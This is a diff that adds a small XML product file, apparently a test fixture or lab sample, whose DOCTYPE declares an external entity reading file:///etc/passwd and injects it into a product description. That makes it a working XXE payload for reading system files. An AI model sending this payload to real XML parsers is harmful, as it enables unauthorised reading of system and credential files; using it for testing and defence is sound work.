@@ -1,0 +1,9 @@
+<!DOCTYPE aaaa [<!ENTITY abc SYSTEM "file:///etc/passwd">]>
+<products>
+    <product>
+        <name>Television</name>
+        <code>102</code>
+        <tags>entertainment</tags>
+        <description>&abc;</description>
+    </product>
+</products>
